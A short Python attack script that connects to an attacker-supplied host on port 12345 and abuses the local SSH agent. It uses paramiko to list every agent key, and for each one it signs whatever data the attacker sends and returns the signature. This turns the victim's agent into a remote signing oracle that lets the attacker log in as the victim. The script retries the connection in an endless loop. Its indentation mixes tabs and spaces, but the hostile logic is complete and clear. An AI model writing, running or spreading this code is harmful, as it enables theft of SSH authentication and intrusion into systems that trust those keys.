import paramiko
import socket
import time
import argparse





if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", required = True, help="Hostname of attacker")
	args = parser.parse_args()



	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        while True: 
            try: 
				s.connect((args.ip, 12345))
				agent = paramiko.Agent()
				for key in agent.get_keys():
					print(f'key_type = {key.get_name()}, pub = {key.asbytes().hex()}, fingerprint = {key.get_fingerprint().hex()}')
					data = s.recv(1024)
					sig = key.sign_ssh_data(data)
					print(f'sig = {sig.hex()}')
					s.sendall(sig)
			except Exception as e:
                print(e)
                time.sleep(2)

